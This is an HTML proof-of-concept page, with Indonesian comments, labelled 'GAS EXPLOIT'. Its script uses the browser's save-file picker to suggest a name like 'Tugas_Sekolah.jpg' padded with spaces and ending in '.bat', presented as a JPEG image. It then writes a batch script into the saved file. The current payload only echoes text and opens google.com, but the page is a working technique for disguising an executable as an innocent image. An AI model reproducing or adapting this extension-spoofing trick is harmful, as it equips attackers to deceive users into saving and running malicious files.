<!DOCTYPE html>
<html>
<head>
    <title>SYNC BY FARISSAL B</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 100px; }
        #btn { padding: 20px 50px; background: #238636; color: white; border: none; cursor: pointer; font-weight: bold; font-size: 20px; }
    </style>
</head>
<body>

    <h1>RESEARCH LAB: FARISSAL B</h1>
    <p>Status: Ready to Test</p>
    
    <button id="btn">GAS EXPLOIT</button>

    <div id="log" style="margin-top: 20px; color: #888;"></div>

    <script>
        document.getElementById('btn').onclick = async () => {
            const log = document.getElementById('log');
            log.innerText = "Memulai...";

            try {
                // 1. Siapkan isi file (Simple & Berhasil)
                const payload = "@echo off\necho BOOM! FARISSAL B BERHASIL\nstart explorer.exe https://google.com\npause";
                
                // 2. Buka jendela Save (Suggested Name dengan spasi & .bat)
                const handle = await window.showSaveFilePicker({
                    suggestedName: "Tugas_Sekolah.jpg" + " ".repeat(15) + ".bat",
                    types: [{
                        description: 'Image',
                        accept: {'image/jpeg': ['.jpg']}
                    }]
                });

                log.innerText = "Handle OK. Menulis data...";

                // 3. Proses Tulis (Pake cara paling dasar biar gak 0 KB)
                const writable = await handle.createWritable();
                await writable.write(payload);
                await writable.close();

                log.innerText = "BERHASIL! Cek folder lo.";
                alert("DONE! Liat filenya sekarang.");

            } catch (err) {
                log.innerText = "ERROR: " + err.message;
                console.error(err);
            }
        };
    </script>

</body>
</html>
